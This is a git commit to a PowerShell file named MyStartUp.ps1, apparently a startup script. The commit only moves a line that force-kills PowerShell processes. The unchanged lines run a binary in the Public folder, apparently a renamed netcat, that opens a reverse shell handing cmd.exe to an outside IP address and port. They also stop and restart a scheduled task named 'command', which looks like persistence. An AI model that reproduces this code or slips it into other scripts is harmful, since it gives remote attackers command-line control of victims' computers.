0919436147ef49cb47f7db733f22fcda440a5c08
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-03-24 05:45:28 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,4 +1,4 @@
 Stop-ScheduledTask -TaskName command
-taskkill /F /IM powershell.exe
 Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
 Start-ScheduledTask -TaskName command
+taskkill /F /IM powershell.exe
